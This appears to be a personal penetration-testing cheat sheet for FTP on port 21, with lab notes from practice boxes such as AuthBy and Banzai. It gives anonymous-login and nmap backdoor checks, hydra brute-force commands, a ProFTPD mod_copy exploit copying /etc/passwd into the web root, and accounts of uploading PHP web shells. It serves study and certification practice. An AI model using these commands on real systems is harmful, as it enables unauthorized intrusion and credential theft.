# FTP - Port 21

## Anonymous Login

```bash
ftp $IP
# Username: anonymous
# Password: anonymous (or blank)
```

## Nmap Scripts

```bash
nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 $IP
```

## Download Everything

```bash
# Recursive download via wget
wget -r ftp://anonymous:REDACTED/

# Or from inside ftp client
ftp> prompt off
ftp> mget *
```

## Binary Mode

```bash
# ALWAYS set binary mode before downloading executables/archives
ftp> binary
ftp> get file.exe
```

## Check Write Access

```bash
ftp> put test.txt
# If writable — can upload web shells if FTP root overlaps with web root
```

## Manual Enumeration

```bash
ftp> ls -la        # Hidden files
ftp> cd ..         # Try to traverse up
ftp> pwd           # Current directory
```

## Version-Specific Exploits

| Version | Exploit | Notes |
|---------|---------|-------|
| vsftpd 2.3.4 | Backdoor (port 6200) | `nmap --script ftp-vsftpd-backdoor -p 21 $IP` |
| ProFTPD 1.3.5 | mod_copy (SITE CPFR/CPTO) | Copy files without auth |
| ProFTPD 1.3.3c | Remote code execution | `searchsploit proftpd 1.3.3` |

### ProFTPD mod_copy (1.3.5)

```bash
nc $IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Then browse to http://$IP/passwd.txt
```

## See Also

- [[File-Transfers]] | [[Nmap]]

## From Your Boxes

> **AuthBy** (PG/Windows) — Anonymous FTP exposed zFTPServer install files and accounts dir. Hydra brute force found `admin:REDACTED`, which gave access to web root containing `.htpasswd` with crackable hash (`offsec:REDACTED`). Uploaded PHP shell via FTP to get RCE.
> - What worked: `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://TARGET_IP`
> - Lesson: Always brute force FTP with default creds list even if anonymous works — admin may have more access.

> **Banzai** (PG/Linux) — FTP brute force with default creds found `admin:REDACTED`. FTP root was the web root (contained `index.php`, `css/`, `js/`). Uploaded a PHP reverse shell and caught shell as www-data.
> - What worked: `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://TARGET_IP`
> - Lesson: When FTP root contains web files, you can upload a web shell for instant RCE.

> **Charlie (OSCP C)** (Course) — Anonymous FTP exposed a backup directory full of PDFs. Running exiftool on them revealed author names (Cassie, Mark, Robert) which became the user list for further attacks.
> - What worked: `exiftool *.pdf` on files downloaded from anonymous FTP
> - Lesson: Always check file metadata — PDF authors become usernames.

> **Algernon** (PG/Windows) — Microsoft FTP with anonymous access allowed. Contained mail-related directories (ImapRetrieval, PopRetrieval, Spool, Logs) but no direct creds.
> - What worked: `ftp anonymous@TARGET_IP` (blank password)
> - Lesson: Even empty FTP shares tell you what software is running — mail dirs here pointed to SmarterMail.

> **CMS01** (VHL) — Anonymous FTP login on vsFTPd 2.2.2 with a writable `pub` share. No files present but write access meant potential to upload files for use by other services.
> - What worked: `ftp TARGET_IP` with `Anonymous` login
> - Lesson: Check write access on FTP — writable + overlapping web root = shell upload.

> **Relia MAILSERVER** (Course) — Anonymous FTP on non-standard port 14020 (FileZilla). Exposed `umbraco.pdf` containing installation credentials.
> - What worked: FTP anonymous login on port 14020 found credentials in a PDF
> - Lesson: FTP can run on non-standard ports — always check all ports. Documents on FTP shares may contain creds.
